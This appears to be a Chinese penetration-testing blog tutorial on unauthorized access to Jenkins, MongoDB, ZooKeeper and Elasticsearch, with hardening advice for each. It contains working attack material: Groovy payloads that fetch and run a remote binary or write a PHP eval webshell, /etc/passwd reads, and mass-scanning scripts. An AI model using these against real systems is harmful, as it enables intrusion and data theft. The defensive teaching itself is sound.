+<h2 id="0x02-Jenkins未授权访问"><a href="#0x02-Jenkins未授权访问" class="headerlink" title="0x02 Jenkins未授权访问"></a>0x02 Jenkins未授权访问</h2><h4 id="1-扫描探测-1"><a href="#1-扫描探测-1" class="headerlink" title="1.扫描探测"></a><strong>1.扫描探测</strong></h4><p>弱口令扫描:<a href="https://github.com/blackye/Jenkins" target="_blank" rel="noopener">https://github.com/blackye/Jenkins</a> 或者 <a href="https://github.com/blackye/Jenkins" target="_blank" rel="noopener">https://github.com/blackye/Jenkins</a><br>From: <a href="https://www.secpulse.com/archives/2166.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/2166.html</a><br>CVE-2017-1000353:<a href="https://blogs.securiteam.com/index.php/archives/3171" target="_blank" rel="noopener">https://blogs.securiteam.com/index.php/archives/3171</a><br>提示: script/manage 是管理页面<br><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7hyaw1gj31db0u04gf.jpg" alt="img"></p>
+<h4 id="2-攻击利用"><a href="#2-攻击利用" class="headerlink" title="2. 攻击利用"></a>2. 攻击利用</h4><p><strong>2.1 反弹shell</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">println &quot;wget http:&#x2F;&#x2F;192.168.3.131:8081&#x2F;exp -P &#x2F;tmp&#x2F;&quot;.execute().text</span><br><span class="line">println &quot;chmod +x &#x2F;tmp&#x2F;exp&quot;.execute().text</span><br><span class="line">println &quot;&#x2F;tmp&#x2F;exp&quot;.execute().text</span><br></pre></td></tr></table></figure>
+
+<p>或者直接通过 Terminal+Plugin<br><a href="https://wiki.jenkins.io/display/JENKINS/Terminal+Plugin" target="_blank" rel="noopener">https://wiki.jenkins.io/display/JENKINS/Terminal+Plugin</a></p>
+<p><strong>2.2 写webshell</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1. println &quot;wget http:&#x2F;&#x2F;shell.com&#x2F;shell.txt -P &#x2F;var&#x2F;www&#x2F;html&#x2F;&quot;.execute().text</span><br><span class="line"></span><br><span class="line">2. new File(&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php&quot;).write(&#39;&lt;?php @eval($_POST[shell]);?&gt;&#39;);</span><br><span class="line"></span><br><span class="line">3. </span><br><span class="line">def webshell &#x3D; &#39;&lt;?php @eval($_POST[shell]);?&gt;&#39;</span><br><span class="line">new File(&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php&quot;).write(&quot;$webshell&quot;);</span><br><span class="line"></span><br><span class="line">4. </span><br><span class="line">def execute(cmd) &#123;</span><br><span class="line">def proc &#x3D; cmd.execute()</span><br><span class="line">proc.waitFor()</span><br><span class="line">&#125;</span><br><span class="line">execute( [ &#39;bash&#39;, &#39;-c&#39;, &#39;echo -n &quot;&lt;?php @eval($&quot; &gt; &#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php&#39; ] )</span><br><span class="line">execute( [ &#39;bash&#39;, &#39;-c&#39;, &#39;echo &quot;_POST[shell]);?&gt;&quot; &gt;&gt; &#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php&#39; ] )</span><br><span class="line">&#x2F;&#x2F;参数-n 不要在最后自动换行</span><br></pre></td></tr></table></figure>
+
+<p><strong>2.3 读文件</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">try&#123;</span><br><span class="line"></span><br><span class="line">text &#x3D; new File(&quot;&#x2F;etc&#x2F;passwd&quot;).getText();</span><br><span class="line"></span><br><span class="line">out.print text</span><br><span class="line"></span><br><span class="line">&#125; catch(Exception e)&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>2.4 执行命令</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def sout &#x3D; new StringBuilder(), serr &#x3D; new StringBuilder()</span><br><span class="line">def proc &#x3D; &#39;cat &#x2F;etc&#x2F;passwd&#39;.execute()</span><br><span class="line">proc.consumeProcessOutput(sout, serr)</span><br><span class="line">proc.waitForOrKill(1000)</span><br><span class="line">println &quot;out&gt; $sout err&gt; $serr&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>回显注意点</strong></p>
+<ul>
+<li>Result: 0 表示成功写入</li>
+<li>Result: 1 表示目录不存在或者权限不足 写入失败</li>
+<li>Result: 2 表示构造有异常 写入失败</li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7iw12uij313z0d4niy.jpg" alt="image-20200720100155148"></p>
+<p>jenkins可以对每个用户分配不同的权限，如Overall/RunScripts或者Job/Configure权限<br>某些版本匿名用户可以访问asynchPeople 可爆破密码（通常很多密码跟用户名一样或者是其他弱口令(top1000)，尤其是内网）</p>
+<h4 id="3-模拟低权限"><a href="#3-模拟低权限" class="headerlink" title="3. 模拟低权限"></a><strong>3. 模拟低权限</strong></h4><h6 id="省略掉注册并且安装plugin的傻瓜式操作"><a href="#省略掉注册并且安装plugin的傻瓜式操作" class="headerlink" title="省略掉注册并且安装plugin的傻瓜式操作"></a>省略掉注册并且安装plugin的傻瓜式操作</h6><p>默认安装的情况下，匿名用户是没有任何权限的，这里修改配置，让匿名用户只拥有 查看Job、Job Configure 权限</p>
+<p>1.点击 管理(Manage Jenkins) - Configure Global Security</p>
+<p>2.在 添加用户/组(User/group to add): 填入当前登录的用户名，然后点击 Add，移到最右侧，点击 ✔️，让用户拥有所有权限<br>此步非常重要，不然保存后会导致 admin is missing the Overall/Read permission 错误,如下图所示<br><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7jao333j31bw0u04fi.jpg" alt="img"></p>
+<p>3.然后访问 <a href="http://127.0.0.1:8080/newJob" target="_blank" rel="noopener">http://127.0.0.1:8080/newJob</a> ,名称填 Test，类型选择 构建一个自由风格的软件项目(Freestyle project )后点击 Save,如下图所示代表创建成功<br><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7jn8iu2j31um0lywnq.jpg" alt="img"></p>
+<p>4.新建一个无痕窗口,通过匿名访问看到有配置权限<br><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7jyzv9ej31bw0u0wvu.jpg" alt="img"><br>点击 配置(Configure)，在 Build 部分选择 Execute shell</p>
+<p>在 Command 中填入要执行的命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id</span><br><span class="line">uname -a </span><br><span class="line">cat &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7khfjehj31vc0mcwlw.jpg" alt="img"></p>
+<p>5.通过查看 Configure 页面的选项，得知在 构建触发器(Build Triggers) 部分可以设置任务 Build 的触发规则，其中有一个 Build periodically，可以通过类似 Crontab 时间规则来触发，这里填入 <code>*/1 * * * *</code> 即每分钟执行一次 Build，点击 Save<br><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7l049boj31ry0qgwri.jpg" alt="img"></p>
+<p>6.回到 Job 页面，等待一会，在左侧 Build History 可以看到，每分钟都会执行一次 Build，这里点击查看 Console Output<br><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7lp6avzj31ze0tmwt3.jpg" alt="img"><br>命令执行成功<br><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7mj6ag6j31bw0u07wh.jpg" alt="img"></p>
+<p>匿名用户是没有 Build 权限，即 Job 的页面中是没有 立即构建(Build Now) 按钮，所以这里无法通过点击 立即构建 来触发命令的执行。</p>
+<h4 id="4-防护措施"><a href="#4-防护措施" class="headerlink" title="4. 防护措施"></a><strong>4. 防护措施</strong></h4><ul>
+<li>在Jenkins管理页面添加访问密码。建议您使用由十位以上数字，字母和特殊符号组成的强密码。</li>
+<li>建议您不要将管理后台开放到互联网上。您可以使用ECS安全组策略设置访问控制，默认策略为拒绝所有通信。您可以根据业务发布情况仅开放* 需要对外用户提供的服务，并控制好访问源IP。</li>
+</ul>
+<h2 id="0x03-MongoDB未授权访问"><a href="#0x03-MongoDB未授权访问" class="headerlink" title="0x03 MongoDB未授权访问"></a>0x03 MongoDB未授权访问</h2><p>MongoDB 默认直接连接，无须身份验证，如果当前机器可以公网访问，且不注意Mongodb 端口（默认 27017）的开放状态，那么Mongodb就会产生安全风险，被利用此配置漏洞，入侵数据库。</p>
+<ul>
+<li>使用默认 mongod 命令启动 Mongodb</li>
+<li>机器可以被公网访问</li>
+<li>在公网上开放了 Mongodb 端口</li>
+<li>数据库隐私泄露</li>
+<li>数据库被清空</li>
+<li>数据库运行缓慢</li>
+</ul>
+<h4 id="1-扫描探测-2"><a href="#1-扫描探测-2" class="headerlink" title="1. 扫描探测"></a><strong>1. 扫描探测</strong></h4><p>下载：<a href="http://nmap.org/svn/scripts/mongodb-info.nse" target="_blank" rel="noopener">http://nmap.org/svn/scripts/mongodb-info.nse</a><br><code>nmap -p 27017 --script mongodb-info &lt;ip&gt;</code><br><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7n3llvmj31s90u0hdt.jpg" alt="img"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;mongodb.conf</span><br><span class="line">dbpath &#x3D; &#x2F;data&#x2F;</span><br><span class="line">logpath &#x3D; &#x2F;var&#x2F;logs&#x2F;mongodb.log</span><br><span class="line">##port &#x3D; 27017</span><br><span class="line">##fork &#x3D; true</span><br><span class="line">bind_ip &#x3D; 0.0.0.0</span><br><span class="line"></span><br><span class="line">.&#x2F;mongod –config mongodb.conf &#x2F;&#x2F;启动mongodb加载配置mongodb.conf</span><br></pre></td></tr></table></figure>
+
+<p><strong>1.1 基础</strong><br><a href="https://www.jianshu.com/p/8bf26effa737" target="_blank" rel="noopener">https://www.jianshu.com/p/8bf26effa737</a><br><a href="http://www.runoob.com/mongodb/mongodb-tutorial.html" target="_blank" rel="noopener">http://www.runoob.com/mongodb/mongodb-tutorial.html</a><br><a href="https://itbilu.com/database/mongo/E1tWQz4_e.html" target="_blank" rel="noopener">https://itbilu.com/database/mongo/E1tWQz4_e.html</a></p>
+<p><strong>1.2 批量扫描未授权</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line">import pymongo</span><br><span class="line"></span><br><span class="line">ipcons &#x3D; []</span><br><span class="line">def Scanner(ip):</span><br><span class="line">    global ipcons</span><br><span class="line">    sk &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sk.settimeout(0.3)</span><br><span class="line">    try:</span><br><span class="line">        sk.connect((ip,27017))</span><br><span class="line">        ipcons.append(ip)</span><br><span class="line">        sk.close()</span><br><span class="line">    except Exception:</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">def ip2num(ip):</span><br><span class="line">    ip&#x3D;[int(x) for x in ip.split(&#39;.&#39;)]</span><br><span class="line">    return ip[0] &lt;&lt;24 | ip[1]&lt;&lt;16 | ip[2]&lt;&lt;8 |ip[3]</span><br><span class="line"></span><br><span class="line">def num2ip(num):</span><br><span class="line">    return &#39;%s.%s.%s.%s&#39; %( (num &amp; 0xff000000) &gt;&gt;24,</span><br><span class="line">                                (num &amp; 0x00ff0000) &gt;&gt;16,</span><br><span class="line">                                (num &amp; 0x0000ff00) &gt;&gt;8,</span><br><span class="line">                                num &amp; 0x000000ff )</span><br><span class="line"></span><br><span class="line">def get_ip(ip):</span><br><span class="line">    start,end &#x3D; [ip2num(x) for x in ip.split(&#39; &#39;) ]</span><br><span class="line">    return [ num2ip(num) for num in range(start,end+1) if num &amp; 0xff ]</span><br><span class="line"></span><br><span class="line">startIp &#x3D; sys.argv[1]</span><br><span class="line">endIp &#x3D; sys.argv[2]</span><br><span class="line">iplist &#x3D; get_ip(sys.argv[1]+&quot; &quot;+sys.argv[2])</span><br><span class="line">for i in iplist:</span><br><span class="line">    Scanner(i)</span><br><span class="line"></span><br><span class="line">def connMon(ip_addr):</span><br><span class="line">    print &#39; Connect mongodb: &#39; + ip_addr + &#39;:27017&#39;</span><br><span class="line">    try:</span><br><span class="line">        conn &#x3D; pymongo.MongoClient(ip_addr,27017,socketTimeoutMS&#x3D;3000)</span><br><span class="line">        dbname &#x3D; conn.database_names()</span><br><span class="line">        print &quot;success&quot;</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print &quot;error&quot;</span><br><span class="line"></span><br><span class="line">print ipcons   </span><br><span class="line">for ipaddr in ipcons:</span><br><span class="line">    connMon(ipaddr)</span><br><span class="line">    print &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>1.3 shodan扫描脚本</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">##!&#x2F;usr&#x2F;bin&#x2F;python</span><br><span class="line">## -*- coding: UTF-8 -*-</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">@Author：joy_nick</span><br><span class="line">@博客：http:&#x2F;&#x2F;byd.dropsec.xyz&#x2F;</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">import shodan</span><br><span class="line">import os</span><br><span class="line">iplist &#x3D; []</span><br><span class="line">ip_list &#x3D; []</span><br><span class="line">shodan_ip_list &#x3D; []</span><br><span class="line">def shodanSearch(keywords):</span><br><span class="line">    SHODAN_API_KEY &#x3D; &quot;your key&quot;</span><br><span class="line">    api &#x3D; shodan.Shodan(SHODAN_API_KEY)</span><br><span class="line">    total &#x3D; 0</span><br><span class="line">    try:</span><br><span class="line">        results &#x3D; api.search(keywords)</span><br><span class="line">        total &#x3D; int(results[&#39;total&#39;])</span><br><span class="line">        for result in results[&#39;matches&#39;]:</span><br><span class="line">            ##iplist.append(&#123;&quot;ip&quot;:result[&#39;ip_str&#39;],&quot;country&quot;:result[&#39;location&#39;][&#39;country_name&#39;]&#125;)</span><br><span class="line">            iplist.append(result[&#39;ip_str&#39;])</span><br><span class="line">            for i in range(len(iplist)):</span><br><span class="line">                ip_list &#x3D; iplist[i].encode(&#39;utf-8&#39;)</span><br><span class="line">                shodan_ip_list.append(ip_list)</span><br><span class="line">                s &#x3D; &#39;\n&#39;.join(shodan_ip_list)</span><br><span class="line">                with open(&#39;shodan_ip_list.txt&#39;,&#39;w&#39;) as output:</span><br><span class="line">                    output.write(s)</span><br><span class="line">    except shodan.APIError, e:</span><br><span class="line">        print &#39;Error: %s&#39; % e</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    shodanSearch(&#39;redis&#39;)</span><br></pre></td></tr></table></figure>
+
+<p>查询操作<br><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7nh31zzj30xj0kln2k.jpg" alt="img"></p>
+<h4 id="2-爆破脚本"><a href="#2-爆破脚本" class="headerlink" title="2. 爆破脚本"></a><strong>2. 爆破脚本</strong></h4><p><a href="https://github.com/netxfly/x-crack" target="_blank" rel="noopener">https://github.com/netxfly/x-crack</a><br><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7ns7c1hj31gx0q1n1z.jpg" alt="img"><strong>3. 攻击脚本</strong></p>
+<p><a href="https://github.com/youngyangyang04/NoSQLAttack" target="_blank" rel="noopener">https://github.com/youngyangyang04/NoSQLAttack</a><br><a href="https://www.youtube.com/watch?v=R6-nXCVNxEw" target="_blank" rel="noopener">https://www.youtube.com/watch?v=R6-nXCVNxEw</a><br><a href="https://www.youtube.com/watch?v=R6-nXCVNxEw" target="_blank" rel="noopener">https://www.youtube.com/watch?v=R6-nXCVNxEw</a></p>
+<h4 id="4-防范措施"><a href="#4-防范措施" class="headerlink" title="4. 防范措施"></a><strong>4. 防范措施</strong></h4><p><strong>(1).新建管理账户开启MongoDB授权</strong><br>新建终端[参数默认可以不加，若有自定义参数，才要加上，下同]<br><code>mongod --port 27017 --dbpath /data/db1</code></p>
+<p>另起一个终端，运行下列命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mongo --port 27017</span><br><span class="line"></span><br><span class="line">  use admin</span><br><span class="line"></span><br><span class="line">  db.createUser(</span><br><span class="line">    &#123;</span><br><span class="line">      user: &quot;adminUser&quot;,</span><br><span class="line">      pwd: &quot;adminPass&quot;,</span><br><span class="line">      roles: [ &#123; role: &quot;userAdminAnyDatabase&quot;, db: &quot;admin&quot; &#125; ]</span><br><span class="line">    &#125;</span><br><span class="line">  )</span><br></pre></td></tr></table></figure>
+
+<p>管理员创建成功，现在拥有了用户管理员 用户名:adminUser 密码:adminPass</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7qn8be1j31l70u0u0x.jpg" alt="img"></p>
+<p><strong>(2).本地访问</strong><br>bind 127.0.0.1</p>
+<p><strong>(3).修改默认端口</strong><br>修改默认的mongoDB端口(默认为: TCP 27017)为其他端口</p>
+<p><strong>(4).禁用HTTP和REST端口</strong><br>MongoDB自身带有一个HTTP服务和并支持REST接口。在2.6以后这些接口默认是关闭的。mongoDB默认会使用默认端口监听web服务，一般不需要通过web方式进行远程管理，建议禁用。修改配置文件或在启动的时候选择–nohttpinterface 参数nohttpinterface = false<br><strong>(5).开启日志审计功能</strong><br>审计功能可以用来记录用户对数据库的所有相关操作。这些记录可以让系统管理员在需要的时候分析数据库在什么时段发生了什么事情<br><strong>(6).开启auth认证</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;mongodb.conf　　</span><br><span class="line">auth &#x3D; true</span><br></pre></td></tr></table></figure>
+
+<p>其他:<a href="http://www.mottoin.com/105609.html" target="_blank" rel="noopener">http://www.mottoin.com/105609.html</a></p>
+<h2 id="0x04-ZooKeeper未授权访问"><a href="#0x04-ZooKeeper未授权访问" class="headerlink" title="0x04 ZooKeeper未授权访问"></a>0x04 ZooKeeper未授权访问</h2><p>From: <a href="http://www.polaris-lab.com/index.php/archives/41/" target="_blank" rel="noopener">http://www.polaris-lab.com/index.php/archives/41/</a><br><a href="http://www.majunwei.com/category/201612011952003333/" target="_blank" rel="noopener">http://www.majunwei.com/category/201612011952003333/</a><br><a href="http://www.mottoin.com/92742.html" target="_blank" rel="noopener">http://www.mottoin.com/92742.html</a><br><a href="http://cve.scap.org.cn/CVE-2014-0085.html" target="_blank" rel="noopener">http://cve.scap.org.cn/CVE-2014-0085.html</a><br><a href="http://ifeve.com/zookeeper_guidetozkoperations/" target="_blank" rel="noopener">http://ifeve.com/zookeeper_guidetozkoperations/</a><br><a href="http://blog.csdn.net/u011721501/article/details/44062617" target="_blank" rel="noopener">http://blog.csdn.net/u011721501/article/details/44062617</a></p>
+<p>ZooKeeper是一个分布式的，开放源码的分布式应用程序协调服务，是Google的Chubby一个开源的实现，是Hadoop和Hbase的重要组件。它是一个为分布式应用提供一致性服务的软件，提供的功能包括：配置维护、域名服务、分布式同步、组服务等。</p>
+<h4 id="1-扫描探测-3"><a href="#1-扫描探测-3" class="headerlink" title="1.扫描探测"></a><strong>1.扫描探测</strong></h4><p>ZooKeeper默认开启在2181端口，在未进行任何访问控制情况下，攻击者可通过执行envi命令获得系统大量的敏感信息，包括系统名称、Java环境。<br><code>./zkCli.sh -server 127.0.0.1 2181</code></p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7ri7ikpj31it0u0kjn.jpg" alt="img"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -p2181 -oG zookeeper.gnmap 192.168.1.0&#x2F;24  </span><br><span class="line">grep &quot;Ports: 2181&#x2F;open&#x2F;tcp&quot; zookeeper.gnmap | cut -f 2 -d &#39; &#39; &gt; Live.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7rwv08mj31th0u0qv5.jpg" alt="img"></p>
+<h4 id="2-攻击获取信息"><a href="#2-攻击获取信息" class="headerlink" title="2.攻击获取信息"></a><strong>2.攻击获取信息</strong></h4><ul>
+<li>stat：列出关于性能和连接的客户端的统计信息。<br>echo stat |ncat 127.0.0.1 2181</li>
+<li>ruok：测试服务器是否运行在非错误状态。<br>echo ruok |ncat 127.0.0.1 2181</li>
+<li>reqs：列出未完成的请求。<br>echo reqs |ncat 127.0.0.1 2181</li>
+<li>envi：打印有关服务环境的详细信息。<br>echo envi |ncat 127.0.0.1 2181</li>
+</ul>
+<p>dump：列出未完成的会话和临时节点。<br>echo dump |ncat 127.0.0.1 2181</p>
+<h4 id="3-防范措施"><a href="#3-防范措施" class="headerlink" title="3.防范措施"></a><strong>3.防范措施</strong></h4><ul>
+<li>禁止把Zookeeper直接暴露在公网</li>
+<li>添加访问控制，根据情况选择对应方式（认证用户，用户名密码，指定IP）</li>
+</ul>
+<h2 id="0x05-Elasticsearch未授权访问"><a href="#0x05-Elasticsearch未授权访问" class="headerlink" title="0x05 Elasticsearch未授权访问"></a>0x05 Elasticsearch未授权访问</h2><p>ElasticSearch 是一款Java编写的企业级搜索服务，启动此服务默认会开放HTTP-9200端口，可被非法操作数据。</p>
+<h4 id="1-熟悉的响应-You-Know-for-Search"><a href="#1-熟悉的响应-You-Know-for-Search" class="headerlink" title="1.熟悉的响应 You Know, for Search"></a><strong>1.熟悉的响应</strong> You Know, for Search</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ curl http:&#x2F;&#x2F;127.0.0.1:9200&#x2F;_cat&#x2F;indices&#x2F;</span><br><span class="line"></span><br><span class="line">&#123; &quot;status&quot; : 200, &quot;name&quot; : &quot;Flake&quot;, &quot;cluster_name&quot; : &quot;elasticsearch&quot;, &quot;version&quot; : &#123;&quot;number&quot; : &quot;1.4.1&quot;,&quot; &quot;build_hash&quot; : &quot;b88f43fc40b0bcd7f173xxxxx2e97816de80b19&quot;, &quot;build_timestamp&quot; : &quot;2015-07-29T09:54:16Z&quot;, &quot;build_snapshot&quot; : false, &quot;lucene_version&quot; : &quot;4.10.4&quot;&#125;, &quot;tagline&quot; : &quot;You Know, for Search&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-漏洞测试"><a href="#2-漏洞测试" class="headerlink" title="2.漏洞测试"></a><strong>2.漏洞测试</strong></h4><p>安装了river之后可以同步多种数据库数据（包括关系型的mysql、mongodb等）。<br><code>http://localhost:9200/_cat/indices</code> 里面的indices包含了_river一般就是安装了river了。</p>
+<p><a href="http://localhost:9200/_plugin/head/" target="_blank" rel="noopener">http://localhost:9200/_plugin/head/</a> web管理界面<br><a href="http://localhost:9200/_cat/indices" target="_blank" rel="noopener">http://localhost:9200/_cat/indices</a><br><a href="http://localhost:9200/_river/_search" target="_blank" rel="noopener">http://localhost:9200/_river/_search</a> 查看数据库敏感信息<br><a href="http://localhost:9200/_nodes" target="_blank" rel="noopener">http://localhost:9200/_nodes</a> 查看节点数据</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7t0lki6j31yh0sbx6q.jpg" alt="img"><br><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7t9vlvxj31jl0u01kx.jpg" alt="img"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">##! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">## _*_  coding:utf-8 _*_</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">def Elasticsearch_check(ip, port&#x3D;9200, timeout&#x3D;5):</span><br><span class="line">    try:</span><br><span class="line">    　　url &#x3D; &quot;http:&#x2F;&#x2F;&quot;+ip+&quot;:&quot;+str(port)+&quot;&#x2F;_cat&quot;</span><br><span class="line">    　　response &#x3D; requests.get(url) </span><br><span class="line">    except:</span><br><span class="line">    　　pass</span><br><span class="line">    if &quot;&#x2F;_cat&#x2F;master&quot; in response.content:</span><br><span class="line">    　　print &#39;[+] Elasticsearch Unauthorized: &#39; +ip+&#39;:&#39;+str(port)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    Elasticsearch_check(&quot;127.0.0.1&quot;)</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://www.secpulse.com/archives/46394.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/46394.html</a></p>
+<h4 id="3-漏洞修复"><a href="#3-漏洞修复" class="headerlink" title="3.漏洞修复"></a><strong>3.漏洞修复</strong></h4><p>(1)、默认开启的9200端口和使用的端口不对外公布，或架设内网环境。或者防火墙上设置禁止外网访问9200端口。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; accept</span><br><span class="line">## iptables -A INPUT -p tcp -s 127.0.0.1 --dport 9200 -j ACCEPT</span><br><span class="line">## iptables -A INPUT -p udp -s 127.0.0.1 --dport 9200 -j ACCEPT</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; drop</span><br><span class="line">## iptables -I INPUT -p tcp --dport 9200 -j DROP</span><br><span class="line">## iptables -I INPUT -p udp --dport 9200 -j DROP</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 保存规则并重启 iptables</span><br><span class="line">## service iptables save</span><br><span class="line">## service iptables restart</span><br></pre></td></tr></table></figure>
+
